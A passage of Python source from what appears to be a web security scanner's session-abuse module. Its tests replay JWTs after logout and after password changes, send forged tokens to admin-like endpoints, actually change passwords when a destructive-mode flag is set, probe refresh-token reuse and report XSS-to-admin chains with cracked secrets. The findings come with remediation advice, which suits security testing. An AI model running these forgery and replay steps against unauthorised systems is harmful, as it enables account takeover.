                await rate_limiter.acquire()
                try:
                    async with session.get(url, headers=forged_headers, ssl=_SSL_CTX) as resp:
                        if resp.status == 200:
                            ct = resp.headers.get("content-type", "")
                            body = await resp.text()
                            if "json" in ct and self._is_real_data(body, path):
                                return (path, resp.status, body[:500])
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue
                continue

            # For unknown paths, check without auth first
            if discovered_status == 0:
                await rate_limiter.acquire()
                try:
                    async with session.get(url, ssl=_SSL_CTX) as resp_noauth:
                        noauth_status = resp_noauth.status
                    if noauth_status in (401, 403):
                        await rate_limiter.acquire()
                        async with session.get(url, headers=forged_headers, ssl=_SSL_CTX) as resp:
                            if resp.status == 200:
                                ct = resp.headers.get("content-type", "")
                                body = await resp.text()
                                if "json" in ct and self._is_real_data(body, path):
                                    return (path, resp.status, body[:500])
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

        # Strategy B: Use whoami endpoint to verify forged token is accepted
        # If server accepts the forged token at all, that's proof of tampering
        whoami = self._discovered.get("whoami")
        if whoami:
            whoami_path, _ = whoami
            await rate_limiter.acquire()
            try:
                async with session.get(
                    f"{base_url}{whoami_path}", headers=forged_headers, ssl=_SSL_CTX,
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        return (whoami_path, resp.status, body[:500])
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass

        return None

    def _is_real_data(self, body: str, path: str) -> bool:
        """Check if response is real API data (not SPA HTML fallback)."""
        body_stripped = body.strip()
        # JSON responses are real data
        if body_stripped.startswith(("{", "[")):
            return True
        # If path looks like API but response is HTML, it's a SPA fallback
        api_prefixes = ("/api/", "/rest/", "/v1/", "/v2/", "/admin/api")
        if any(path.startswith(p) for p in api_prefixes) and "<html" in body.lower():
            return False
        return False

    # ------------------------------------------------------------------
    # Test 3: Logout Bypass (fresh session)
    # ------------------------------------------------------------------

    async def _test_logout_bypass_fresh_session(
        self,
        base_url: str,
        token: str,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Verify logout doesn't invalidate token using completely fresh sessions."""
        findings: list[dict] = []
        whoami = self._discovered.get("whoami")
        logout = self._discovered.get("logout")

        if not whoami or not logout:
            return findings

        whoami_path, _ = whoami
        logout_path, _ = logout
        auth_headers = {"Authorization": f"Bearer {token}"}
        timeout = aiohttp.ClientTimeout(total=10)

        # Step 1: Fresh session — call logout (no cookies, JWT-only auth)
        async with aiohttp.ClientSession(
            timeout=timeout,
            cookie_jar=aiohttp.DummyCookieJar(),
        ) as fresh1:
            await rate_limiter.acquire()
            try:
                async with fresh1.post(
                    f"{base_url}{logout_path}", headers=auth_headers, ssl=_SSL_CTX,
                ) as resp:
                    logout_status = resp.status
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return findings

        # Step 2: Completely new session — replay token (no cookies)
        async with aiohttp.ClientSession(
            timeout=timeout,
            cookie_jar=aiohttp.DummyCookieJar(),
        ) as fresh2:
            await rate_limiter.acquire()
            async with fresh2.get(
                f"{base_url}{whoami_path}", headers=auth_headers, ssl=_SSL_CTX,
            ) as resp:
                if resp.status == 200:
                    findings.append(Finding(
                        vuln_type=VulnType.SESSION_HIJACKING,
                        name="Logout Does Not Invalidate JWT Token",
                        severity=Severity.HIGH,
                        description=(
                            "After calling the logout endpoint, the JWT token remains "
                            "valid when used from a completely new HTTP session (no "
                            "shared cookies). This proves the server does not maintain "
                            "a token denylist. An attacker with a stolen token can use "
                            "it indefinitely regardless of user logout."
                        ),
                        host=base_url,
                        endpoint=f"{base_url}{whoami_path}",
                        evidence=[
                            f"Logout: POST {logout_path} -> {logout_status}",
                            f"Replay (fresh session): GET {whoami_path} -> 200",
                            "Token NOT invalidated server-side",
                        ],
                        cvss_score=6.5,
                        cwe_id="CWE-613",
                        confidence_score=85,
                        remediation=(
                            "Implement server-side token denylist. On logout, blacklist "
                            "the token's JTI claim. Check denylist on every request."
                        ),
                        metadata={
                            "module": "session_abuse",
                            "attack_type": "logout_bypass_fresh_session",
                            "logout_path": logout_path,
                            "logout_status": logout_status,
                            "whoami_path": whoami_path,
                        },
                    ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 4: Token Survives Password Change
    # ------------------------------------------------------------------

    async def _test_token_survives_password_change(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
        auth_ctx: Any,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test if old JWT still works after password change."""
        findings: list[dict] = []

        # FIX SAFE-01: This test ACTUALLY changes password - block in safe modes
        if not ALLOW_DESTRUCTIVE_SESSION_TESTS:
            logger.info("⚠️ SAFE MODE: Skipping password change test (destructive)")
            return findings

        whoami = self._discovered.get("whoami")
        if not whoami:
            return findings

        whoami_path, _ = whoami
        auth_headers = {"Authorization": f"Bearer {token}"}

        # We need a password to change from
        # Use a known password from auth_ctx.extra or try generic
        old_password = auth_ctx.extra.get("password", "")
        if not old_password:
            return findings  # Can't test without knowing current password

        new_password = "Ph@nt0m_Changed_1!Aa"

        # Try each password change endpoint with each body format
        pw_changed = False
        pw_change_path = None
        for path in GENERIC_PASSWORD_CHANGE_PATHS:
            url = f"{base_url}{path}"
            for body_fn in PASSWORD_CHANGE_BODIES:
                body = body_fn(old_password, new_password)
                await rate_limiter.acquire()
                try:
                    async with session.post(
                        url, json=body, headers=auth_headers, ssl=_SSL_CTX,
                    ) as resp:
                        if resp.status == 200:
                            pw_changed = True
                            pw_change_path = path
                            break
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue
            if pw_changed:
                break

        if not pw_changed:
            return findings  # No password change endpoint found

        # Replay old token after password change
        await rate_limiter.acquire()
        async with session.get(
            f"{base_url}{whoami_path}", headers=auth_headers, ssl=_SSL_CTX,
        ) as resp:
            if resp.status == 200:
                findings.append(Finding(
                    vuln_type=VulnType.SESSION_HIJACKING,
                    name="JWT Token Valid After Password Change",
                    severity=Severity.HIGH,
                    description=(
                        "JWT token remains valid after password change. An attacker "
                        "who has stolen a token can continue using it even after the "
                        "victim changes their password. All previous tokens should be "
                        "invalidated upon password change."
                    ),
                    host=base_url,
                    endpoint=f"{base_url}{whoami_path}",
                    evidence=[
                        f"Password changed: POST {pw_change_path} -> 200",
                        f"Old token replay: GET {whoami_path} -> 200 (still valid)",
                    ],
                    cvss_score=7.1,
                    cwe_id="CWE-613",
                    confidence_score=85,
                    remediation=(
                        "Invalidate all existing tokens when password changes. "
                        "Use a per-user token version counter or JTI denylist. "
                        "Force re-authentication after password change."
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "token_survives_password_change",
                        "pw_change_path": pw_change_path,
                    },
                ).to_dict())

        # Restore original password if possible (cleanup)
        for body_fn in PASSWORD_CHANGE_BODIES:
            body = body_fn(new_password, old_password)
            try:
                async with session.post(
                    f"{base_url}{pw_change_path}",
                    json=body, headers=auth_headers, ssl=_SSL_CTX,
                ) as resp:
                    if resp.status == 200:
                        break
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue

        return findings

    # ------------------------------------------------------------------
    # Test 5: Enhanced Session Fixation
    # ------------------------------------------------------------------

    async def _test_session_fixation(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        auth_ctx: Any,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test if session cookies rotate after authentication."""
        findings: list[dict] = []

        # Step 1: Get initial session cookies
        await rate_limiter.acquire()
        pre_cookies: dict[str, str] = {}
        try:
            async with session.get(f"{base_url}/", ssl=_SSL_CTX) as resp:
                for cookie_name in SESSION_COOKIE_NAMES:
                    for cookie in resp.cookies.values():
                        if cookie.key.lower() == cookie_name.lower():
                            pre_cookies[cookie.key] = cookie.value
                    # Also check Set-Cookie headers
                    for header_val in resp.headers.getall("Set-Cookie", []):
                        for name in SESSION_COOKIE_NAMES:
                            if header_val.lower().startswith(name.lower() + "="):
                                val = header_val.split("=", 1)[1].split(";")[0]
                                pre_cookies[name] = val
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return findings

        if not pre_cookies:
            return findings  # No session cookies found

        # Step 2: Login (trigger authentication state change)
        login_path = None
        for path in GENERIC_LOGIN_PATHS:
            url = f"{base_url}{path}"
            bodies = [
                {"email": auth_ctx.email, "password": auth_ctx.extra.get("password", "test")},
                {"username": auth_ctx.email, "password": auth_ctx.extra.get("password", "test")},
            ]
            for body in bodies:
                await rate_limiter.acquire()
                try:
                    async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
                        if resp.status == 200:
                            login_path = path
                            # Step 3: Check if session cookies changed
                            for cookie_name, pre_value in pre_cookies.items():
                                for cookie in resp.cookies.values():
                                    if cookie.key.lower() == cookie_name.lower():
                                        if cookie.value == pre_value:
                                            findings.append(Finding(
                                                vuln_type=VulnType.SESSION_HIJACKING,
                                                name="Session Fixation — Cookie Not Rotated After Login",
                                                severity=Severity.HIGH,
                                                description=(
                                                    f"Session cookie '{cookie_name}' retains the "
                                                    f"same value before and after authentication. "
                                                    f"An attacker can set a known session ID in the "
                                                    f"victim's browser and hijack their session after "
                                                    f"they authenticate."
                                                ),
                                                host=base_url,
                                                endpoint=f"{base_url}{path}",
                                                evidence=[
                                                    f"Cookie: {cookie_name}",
                                                    f"Pre-login value: {pre_value[:40]}...",
                                                    f"Post-login value: {cookie.value[:40]}... (SAME)",
                                                    f"Login endpoint: POST {path}",
                                                ],
                                                cvss_score=7.5,
                                                cwe_id="CWE-384",
                                                confidence_score=85,
                                                remediation=(
                                                    "Regenerate session ID after successful authentication. "
                                                    "Call req.session.regenerate() (Express), "
                                                    "session_regenerate_id() (PHP), or equivalent."
                                                ),
                                                metadata={
                                                    "module": "session_abuse",
                                                    "attack_type": "session_fixation",
                                                    "cookie_name": cookie_name,
                                                    "login_path": path,
                                                },
                                            ).to_dict())
                            break
                except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError):
                    continue
            if login_path:
                break

        return findings

    # ------------------------------------------------------------------
    # Test 6: XSS → Token → Privilege Escalation Chain
    # ------------------------------------------------------------------

    async def _test_xss_token_chain(
        self,
        base_url: str,
        token: str,
        existing_findings: list[dict],
    ) -> list[dict]:
        """Compose findings from XSS + token abuse into attack chain."""
        findings: list[dict] = []

        # Query SharedFindingsStore for XSS findings
        store = SharedFindingsStore.get_instance()
        xss_findings = store.get_findings_by_type(StoreVulnType.XSS)

        if not xss_findings:
            return findings

        xss_url = xss_findings[0].endpoint or "unknown"

        # Check if we proved role escalation (from Test 2)
        if self._role_escalation_proved:
            findings.append(Finding(
                vuln_type=VulnType.SESSION_HIJACKING,
                name="XSS to Admin Privilege Escalation Chain",
                severity=Severity.CRITICAL,
                description=(
                    f"Complete attack chain: "
                    f"1) XSS at {xss_url} allows JavaScript execution. "
                    f"2) JWT token accessible via localStorage/sessionStorage "
                    f"(not protected by HttpOnly — it's a Bearer token). "
                    f"3) Stolen JWT can be decoded, role modified, and re-signed "
                    f"with the cracked weak secret. "
                    f"4) Forged admin JWT grants administrative access. "
                    f"Impact: Any user visiting a malicious link leads to full "
                    f"admin compromise."
                ),
                host=base_url,
                endpoint=xss_url,
                evidence=[
                    f"XSS confirmed at: {xss_url}",
                    "Token storage: Bearer JWT (accessible via JavaScript)",
                    f"Secret cracked: '{self._cracked_secret}'",
                    "Role escalation: verified (admin endpoint accessed)",
                    "Chain: XSS → Token Theft → Decode → Tamper Role → Admin",
                ],
                cvss_score=9.8,
                cwe_id="CWE-79",
                confidence_score=85,
                remediation=(
                    "1. Fix XSS vulnerabilities (input sanitization, CSP). "
                    "2. Store tokens in HttpOnly cookies instead of localStorage. "
                    "3. Use strong JWT signing secrets (256+ bit random). "
                    "4. Validate roles from database, not JWT claims. "
                    "5. Deploy Content-Security-Policy headers."
                ),
                metadata={
                    "module": "session_abuse",
                    "attack_type": "xss_token_escalation_chain",
                    "chain_steps": [
                        "XSS exploitation",
                        "JWT theft from localStorage",
                        "JWT decode + role modification",
                        "JWT re-signing with cracked secret",
                        "Admin endpoint access",
                    ],
                    "xss_source": xss_url,
                    "cracked_secret": self._cracked_secret,
                },
            ).to_dict())
        else:
            # Partial chain: XSS + token replay (no role escalation)
            # Check if Test 1 proved token replay works
            has_replay = any(
                f.get("name", "").startswith("JWT Token Valid After Logout")
                for f in existing_findings
            )
            if has_replay:
                findings.append(Finding(
                    vuln_type=VulnType.SESSION_HIJACKING,
                    name="XSS to Persistent Session Hijack Chain",
                    severity=Severity.HIGH,
                    description=(
                        f"Attack chain: "
                        f"1) XSS at {xss_url} allows JavaScript execution. "
                        f"2) JWT token accessible via localStorage. "
                        f"3) Stolen token remains valid indefinitely (no "
                        f"server-side invalidation). "
                        f"Impact: Attacker gains persistent access to victim's "
                        f"account, surviving even logout."
                    ),
                    host=base_url,
                    endpoint=xss_url,
                    evidence=[
                        f"XSS confirmed at: {xss_url}",
                        "Token storage: Bearer JWT (JS accessible)",
                        "Token replay: verified (no logout invalidation)",
                        "Chain: XSS → Token Theft → Persistent Replay",
                    ],
                    cvss_score=8.1,
                    cwe_id="CWE-79",
                    confidence_score=80,
                    remediation=(
                        "1. Fix XSS vulnerabilities. "
                        "2. Store tokens in HttpOnly cookies. "
                        "3. Implement token denylist for logout. "
                        "4. Use short-lived access tokens."
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "xss_token_replay_chain",
                        "xss_source": xss_url,
                    },
                ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 7: Cookie Security Flags
    # ------------------------------------------------------------------

    async def _test_cookie_security_flags(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test session cookies for security flags (Secure, HttpOnly, SameSite)."""
        findings: list[dict] = []

        await rate_limiter.acquire()
        try:
            async with session.get(f"{base_url}/", ssl=_SSL_CTX) as resp:
                # Collect Set-Cookie headers
                set_cookies = resp.headers.getall("Set-Cookie", [])
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return findings

        if not set_cookies:
            return findings

        # Analyze each cookie
        for cookie_header in set_cookies:
            cookie_name = cookie_header.split("=")[0].strip()

            # Only check session-related cookies
            if not any(
                name.lower() in cookie_name.lower()
                for name in SESSION_COOKIE_NAMES
            ):
                continue

            cookie_lower = cookie_header.lower()
            issues: list[str] = []

            # Check Secure flag (required for HTTPS)
            if base_url.startswith("https://") and "secure" not in cookie_lower:
                issues.append("Missing Secure flag (cookie sent over HTTP)")

            # Check HttpOnly flag (prevents XSS theft)
            if "httponly" not in cookie_lower:
                issues.append("Missing HttpOnly flag (vulnerable to XSS theft)")

            # Check SameSite flag (CSRF protection)
            if "samesite" not in cookie_lower:
                issues.append("Missing SameSite flag (vulnerable to CSRF)")
            elif "samesite=none" in cookie_lower:
                issues.append("SameSite=None allows cross-site requests")

            if issues:
                # Determine severity based on which flags are missing
                if "HttpOnly" in str(issues):
                    severity = "MEDIUM"
                    cvss = 5.4
                else:
                    severity = "LOW"
                    cvss = 3.7

                findings.append(Finding(
                    vuln_type=VulnType.SESSION_HIJACKING,
                    name=f"Insecure Session Cookie: {cookie_name}",
                    severity=severity,
                    description=(
                        f"Session cookie '{cookie_name}' is missing security flags. "
                        f"Issues: {'; '.join(issues)}. "
                        f"This increases the risk of session hijacking via XSS, "
                        f"man-in-the-middle attacks, or CSRF."
                    ),
                    host=base_url,
                    endpoint=base_url,
                    evidence=[
                        f"Cookie: {cookie_name}",
                        f"Set-Cookie header: {cookie_header[:100]}...",
                        f"Issues: {'; '.join(issues)}",
                    ],
                    cvss_score=cvss,
                    cwe_id="CWE-614" if "Secure" in str(issues) else "CWE-1004",
                    confidence_score=90,
                    remediation=(
                        "Set all session cookies with: "
                        "Secure (HTTPS only), "
                        "HttpOnly (no JavaScript access), "
                        "SameSite=Strict or SameSite=Lax (CSRF protection). "
                        "Example: Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict"
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "insecure_cookie_flags",
                        "cookie_name": cookie_name,
                        "missing_flags": issues,
                    },
                ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 8: Refresh Token Rotation & Reuse
    # ------------------------------------------------------------------

    async def _test_refresh_token_abuse(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        auth_ctx: Any,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test refresh token rotation and reuse vulnerabilities.

        Tests:
        1. Refresh token reuse after rotation (should fail)
        2. Refresh token valid after logout (should fail)
        3. Refresh token with long expiration (should be shorter than access token)
        """
        findings: list[dict] = []

        # Need refresh token from auth context
        refresh_token = auth_ctx.extra.get("refresh_token")
        if not refresh_token:
            logger.debug("[SESSION_ABUSE] No refresh token in auth context — skipping refresh tests")
            return findings

        # Find working refresh endpoint
        refresh_endpoint = None
        refresh_response = None
        new_access_token = None
        new_refresh_token = None

        for path in GENERIC_REFRESH_PATHS:
            url = f"{base_url}{path}"
            await rate_limiter.acquire()

            # Try different refresh body formats
            bodies = [
                {"refresh_token": refresh_token},
                {"refreshToken": refresh_token},
                {"refresh": refresh_token},
                {"grant_type": "refresh_token", "refresh_token": refresh_token},
            ]

            refresh_endpoint = None
            refresh_response = None

            for body in bodies:
                try:
                    async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
                        if resp.status == 200:
                            try:
                                data = await resp.json()
                                if isinstance(data, dict):
                                    # Extract new tokens safely
                                    new_access_token = (
                                        data.get("access_token")
                                        or data.get("accessToken")
                                        or data.get("token")
                                    )
                                    new_refresh_token = (
                                        data.get("refresh_token")
                                        or data.get("refreshToken")
                                    )

                                    if new_access_token:
                                        refresh_endpoint = path
                                        refresh_response = data
                                        break
                            except (json.JSONDecodeError, aiohttp.ContentTypeError):
                                continue
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

            if refresh_endpoint:
                break

        if not refresh_endpoint:
            logger.debug("[SESSION_ABUSE] No refresh endpoint found")
            return findings

        logger.info(f"[SESSION_ABUSE] Refresh endpoint found: {refresh_endpoint}")


        # Test 8a: Refresh Token Reuse After Rotation
        # If server issued a new refresh token, the old one should be invalidated
        if new_refresh_token and new_refresh_token != refresh_token:
            await rate_limiter.acquire()
            try:
                # Try using OLD refresh token again
                async with session.post(
                    f"{base_url}{refresh_endpoint}",
                    json={"refresh_token": refresh_token},
                    ssl=_SSL_CTX,
                ) as resp:
                    if resp.status == 200:
                        try:
                            reuse_data = await resp.json()
                            if isinstance(reuse_data, dict) and (reuse_data.get("access_token") or reuse_data.get("token")):
                                findings.append(Finding(
                                    vuln_type=VulnType.SESSION_HIJACKING,
                                    name="Refresh Token Reuse After Rotation",
                                    severity=Severity.HIGH,
                                    description=(
                                        "Old refresh tokens remain valid after rotation. "
                                        "When a refresh token is used to obtain new tokens, "
                                        "the old refresh token should be immediately invalidated. "
                                        "An attacker who steals a refresh token can maintain "
                                        "persistent access even after the legitimate user refreshes."
                                    ),
                                    host=base_url,
                                    endpoint=f"{base_url}{refresh_endpoint}",
                                    evidence=[
                                        f"Refresh endpoint: POST {refresh_endpoint}",
                                        "Original refresh token used → new tokens issued",
                                        "Original refresh token reused → STILL WORKS (vulnerability)",
                                        "New refresh token was issued but old one not invalidated",
                                    ],
                                    cvss_score=7.5,
                                    cwe_id="CWE-613",
                                    confidence_score=90,
                                    remediation=(
                                        "Implement refresh token rotation with one-time use. "
                                        "When a refresh token is used, immediately invalidate it "
                                        "and issue a new one. Store token hashes server-side "
                                        "to enforce single-use."
                                    ),
                                    metadata={
                                        "module": "session_abuse",
                                        "attack_type": "refresh_token_reuse",
                                        "refresh_endpoint": refresh_endpoint,
                                    },
                                ).to_dict())
                        except (json.JSONDecodeError, aiohttp.ContentTypeError):
                            pass
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass

        # Test 8b: Refresh Token Valid After Logout
        logout = self._discovered.get("logout")
        if logout:
            logout_path, _ = logout
            auth_headers = {"Authorization": f"Bearer {new_access_token or auth_ctx.token}"}

            # Call logout
            await rate_limiter.acquire()
            try:
                async with session.post(
                    f"{base_url}{logout_path}",
                    headers=auth_headers,
                    ssl=_SSL_CTX,
                ) as resp:
                    logout_status = resp.status
            except (aiohttp.ClientError, asyncio.TimeoutError):
                logout_status = 0

            if logout_status in (200, 204, 302):
                # Try using refresh token after logout
                await rate_limiter.acquire()
                try:
                    async with session.post(
                        f"{base_url}{refresh_endpoint}",
                        json={"refresh_token": new_refresh_token or refresh_token},
                        ssl=_SSL_CTX,
                    ) as resp:
                        if resp.status == 200:
                            try:
                                data = await resp.json()
                                if isinstance(data, dict) and (data.get("access_token") or data.get("token")):
                                    findings.append(Finding(
                                        vuln_type=VulnType.SESSION_HIJACKING,
                                        name="Refresh Token Valid After Logout",
                                        severity=Severity.HIGH,
                                        description=(
                                            "Refresh token remains valid after logout. "
                                            "The logout endpoint should revoke both access "
                                            "and refresh tokens. An attacker can use a stolen "
                                            "refresh token to regain access even after the "
                                            "legitimate user logs out."
                                        ),
                                        host=base_url,
                                        endpoint=f"{base_url}{refresh_endpoint}",
                                        evidence=[
                                            f"Logout: POST {logout_path} -> {logout_status}",
                                            f"Post-logout refresh: POST {refresh_endpoint} -> 200",
                                            "New access token issued after logout!",
                                        ],
                                        cvss_score=7.1,
                                        cwe_id="CWE-613",
                                        confidence_score=90,
                                        remediation=(
                                            "Revoke all tokens (access + refresh) on logout. "
                                            "Maintain a server-side denylist keyed by token "
                                            "family or user session. Check denylist on refresh."
                                        ),
                                        metadata={
                                            "module": "session_abuse",
                                            "attack_type": "refresh_token_post_logout",
                                            "logout_path": logout_path,
                                            "refresh_endpoint": refresh_endpoint,
                                        },
                                    ).to_dict())
                            except (json.JSONDecodeError, aiohttp.ContentTypeError):
                                pass
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass

        return findings

    # ------------------------------------------------------------------
    # Test 9: Concurrent Sessions / Multi-Device Logout
    # ------------------------------------------------------------------

    async def _test_concurrent_sessions(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        auth_ctx: Any,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test concurrent session handling and forced logout.

        Tests:
        1. Session listing endpoint exists (security feature)
        2. Multiple logins invalidate previous sessions
        3. Session limit enforcement
        """
        findings: list[dict] = []
        auth_headers = {"Authorization": f"Bearer {auth_ctx.token}"}

        # Test 9a: Check for session management endpoint
        sessions_endpoint = None
        for path in GENERIC_SESSIONS_PATHS:
            url = f"{base_url}{path}"
            await rate_limiter.acquire()
            try:
                async with session.get(url, headers=auth_headers, ssl=_SSL_CTX) as resp:
                    if resp.status == 200:
                        ct = resp.headers.get("content-type", "")
                        if "json" in ct:
                            sessions_endpoint = path
                            break
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue

        # Test 9b: Login from "new device" and check if old token still works
        # Simulate a new login and verify old session is NOT invalidated
        # (which would be a security issue for high-security apps)

        login_path = None
        new_token = None

        # Need credentials to test new login
        email = auth_ctx.email
        password = auth_ctx.extra.get("password")

        if email and password:
            for path in GENERIC_LOGIN_PATHS:
                url = f"{base_url}{path}"
                bodies = [
                    {"email": email, "password": password},
                    {"username": email, "password": password},
                ]

                for body in bodies:
                    await rate_limiter.acquire()
                    try:
                        # Use fresh session to simulate new device
                        async with aiohttp.ClientSession(
                            timeout=aiohttp.ClientTimeout(total=10),
                            cookie_jar=aiohttp.DummyCookieJar(),
                        ) as new_device:
                            async with new_device.post(url, json=body, ssl=_SSL_CTX) as resp:
                                if resp.status == 200:
                                    try:
                                        data = await resp.json()
                                        if isinstance(data, dict):
                                            new_token = (
                                                data.get("authentication", {}).get("token")
                                                or data.get("token")
                                                or data.get("access_token")
                                                or data.get("accessToken")
                                            )
                                            if new_token:
                                                login_path = path
                                                break
                                    except (json.JSONDecodeError, aiohttp.ContentTypeError):
                                        continue

                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        continue

                if login_path:
                    break

            if new_token and new_token != auth_ctx.token:
                # Got a new token from "second device" — check if old token still works
                whoami = self._discovered.get("whoami")
                if whoami:
                    whoami_path, _ = whoami
                    old_headers = {"Authorization": f"Bearer {auth_ctx.token}"}

                    await rate_limiter.acquire()
                    try:
                        async with session.get(
                            f"{base_url}{whoami_path}",
                            headers=old_headers,
                            ssl=_SSL_CTX,
                        ) as resp:
                            if resp.status == 200:
                                # Old token still works after new login
                                # This is expected for most apps, but worth noting
                                # for security-sensitive applications
                                if not sessions_endpoint:
                                    findings.append(Finding(
                                        vuln_type=VulnType.SESSION_HIJACKING,
                                        name="No Session Management — Multiple Concurrent Sessions Allowed",
                                        severity=Severity.LOW,
                                        description=(
                                            "Multiple concurrent sessions are allowed without "
                                            "any session management interface. Users cannot see "
                                            "or revoke active sessions on other devices. For "
                                            "security-sensitive applications (banking, healthcare), "
                                            "session listing and forced logout is recommended."
                                        ),
                                        host=base_url,
                                        endpoint=base_url,
                                        evidence=[
                                            f"Login from 'new device': POST {login_path} -> new token",
                                            f"Old token check: GET {whoami_path} -> 200 (still valid)",
                                            "No session listing endpoint found",
                                            "Users cannot view or revoke other sessions",
                                        ],
                                        cvss_score=3.7,
                                        cwe_id="CWE-613",
                                        confidence_score=75,
                                        remediation=(
                                            "Implement session management: "
                                            "1. Add endpoint to list active sessions "
                                            "2. Allow users to revoke specific sessions "
                                            "3. Consider single-session enforcement for sensitive apps "
                                            "4. Show session info (device, location, last active)"
                                        ),
                                        metadata={
                                            "module": "session_abuse",
                                            "attack_type": "no_session_management",
                                            "login_path": login_path,
                                        },
                                    ).to_dict())
                            elif resp.status in (401, 403):
                                # Old token invalidated after new login — this is SECURE
                                logger.info(
                                    "[SESSION_ABUSE] Good: New login invalidated old session"
                                )
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        pass

        return findings

    # ------------------------------------------------------------------
    # Test 10: Long-Lived Token Detection
    # ------------------------------------------------------------------

    def _test_long_lived_token(self, token: str, base_url: str) -> list[dict]:
        """Check if JWT has excessive expiration time or no expiration."""
        findings: list[dict] = []

        parsed = JWTToken.parse(token)
        if not parsed:
            return findings

        exp = parsed.payload.get("exp")
        iat = parsed.payload.get("iat")

        now = time.time()

        if not exp:
            # No expiration claim — token never expires!
            findings.append(Finding(
                vuln_type=VulnType.JWT_VULNERABILITY,
                name="JWT Token Has No Expiration",
                severity=Severity.MEDIUM,
                description=(
                    "JWT token lacks an 'exp' (expiration) claim, meaning it never "
                    "expires. If this token is stolen, an attacker has permanent access "
                    "until the signing key is rotated or the user is deleted."
                ),
                host=base_url,
                endpoint=base_url,
                evidence=[
                    "JWT payload lacks 'exp' claim",
                    f"Token prefix: {token[:50]}...",
                    "Token validity: NEVER EXPIRES",
                ],
                cvss_score=5.4,
                cwe_id="CWE-613",
                confidence_score=95,
                remediation=(
                    "Add 'exp' claim to all JWT tokens. Use short expiration for "
                    "access tokens (5-15 minutes) and longer for refresh tokens "
                    "(hours to days). Never issue tokens without expiration."
                ),
                metadata={
                    "module": "session_abuse",
                    "attack_type": "no_token_expiration",
                    "jwt_claims": list(parsed.payload.keys()),
                },
            ).to_dict())
        else:
            remaining = exp - now
            lifetime = exp - iat if iat else remaining

            # Check for excessively long-lived tokens
            # Access tokens > 1 hour is concerning, > 24 hours is definitely wrong
            if lifetime > 86400:  # > 24 hours
                days = int(lifetime / 86400)
                findings.append(Finding(
                    vuln_type=VulnType.SESSION_HIJACKING,
                    name="JWT Access Token Has Excessive Lifetime",
                    severity=Severity.MEDIUM,
                    description=(
                        f"JWT access token has a lifetime of {days}+ days. "
                        f"Long-lived access tokens increase the window of opportunity "
                        f"for token theft and replay attacks. If a token is stolen, "
                        f"the attacker has extended access to the account."
                    ),
                    host=base_url,
                    endpoint=base_url,
                    evidence=[
                        f"Token lifetime: {days} days ({int(lifetime)} seconds)",
                        f"Issued at (iat): {iat}" if iat else "No 'iat' claim",
                        f"Expires at (exp): {exp}",
                        f"Remaining validity: {int(remaining)} seconds",
                    ],
                    cvss_score=4.3,
                    cwe_id="CWE-613",
                    confidence_score=90,
                    remediation=(
                        "Use short-lived access tokens (5-15 minutes). "
                        "Implement refresh token rotation for longer sessions. "
                        "Consider sliding expiration for active users."
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "long_lived_token",
                        "token_lifetime_seconds": int(lifetime),
                        "token_lifetime_days": days,
                    },
                ).to_dict())
            elif lifetime > 3600:  # > 1 hour
                hours = int(lifetime / 3600)
                if hours >= 4:  # Only report if >= 4 hours (some apps use 1-2h legitimately)
                    findings.append(Finding(
                        vuln_type=VulnType.SESSION_HIJACKING,
                        name="JWT Access Token Has Long Lifetime",
                        severity=Severity.LOW,
                        description=(
                            f"JWT access token has a lifetime of {hours} hours. "
                            f"While not critical, shorter token lifetimes reduce "
                            f"the impact window of token theft."
                        ),
                        host=base_url,
                        endpoint=base_url,
                        evidence=[
                            f"Token lifetime: {hours} hours",
                            f"Remaining validity: {int(remaining/3600)} hours",
                        ],
                        cvss_score=2.7,
                        cwe_id="CWE-613",
                        confidence_score=80,
                        remediation=(
                            "Consider using shorter access token lifetimes (5-30 minutes) "
                            "with refresh token rotation for better security."
                        ),
                        metadata={
                            "module": "session_abuse",
                            "attack_type": "moderate_token_lifetime",
                            "token_lifetime_hours": hours,
                        },
                    ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 11: Cross-Session Token Confusion (Multi-User)
    # ------------------------------------------------------------------

    async def _test_cross_session_confusion(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test for cross-session token confusion and session mix-up.

        With multiple authenticated users, we can test:
        1. Can User A's token access User B's data?
        2. Are user-specific endpoints properly isolated?
        3. Session/token confusion leading to data leakage

        This is only possible with multi-user mode (user_personas).
        """
        findings: list[dict] = []

